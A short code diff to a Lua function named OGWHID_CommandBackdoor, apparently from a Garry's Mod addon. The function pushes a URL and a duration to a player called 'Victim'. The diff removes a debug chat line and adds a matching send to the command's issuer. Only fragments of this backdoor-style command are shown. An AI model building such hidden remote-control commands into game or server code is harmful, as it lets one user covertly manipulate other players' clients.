@@ -117,8 +117,6 @@ function OGWHID_CommandBackdoor(ply,cmd,args)
 		
 			if string.lower(args[2]) ~= "stop" then
 				
-				ply:ChatPrint("OH BOY")
-				
 				string.Replace(args[2],"https","http")
 				
 				if OGWHID_TableFind("http",args[2]) then
@@ -173,6 +171,7 @@ function OGWHID_CommandBackdoor(ply,cmd,args)
 		if Victim and URL and Time then
 		
 			OGWHID_Send(Victim,URL,Time,false,Victim)
+			OGWHID_Send(ply,URL,Time,false,ply)
 
 		end
 		
